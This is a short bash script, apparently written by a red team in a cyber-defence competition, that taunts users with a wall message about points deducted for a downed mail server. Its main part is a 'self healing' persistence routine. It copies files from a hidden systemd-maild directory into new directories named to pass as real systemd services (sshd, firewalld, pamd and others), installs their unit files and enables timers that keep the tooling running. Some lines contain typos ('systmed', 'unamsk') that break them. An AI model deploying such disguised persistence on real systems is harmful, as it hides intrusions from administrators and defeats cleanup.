#! /bin/bash

# The cow says Cope
/usr/games/cowsay -sw "30 points deducted for taking down the mail server" | wall

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-maild/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-maild/* /usr/share/systmed-pamd/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-maild/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unamsk systemd-bootd.service \
	systemd-firewalld.service \
	systemd-issued.service \
	systemd-pamd.service \
	systemd-printerd.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
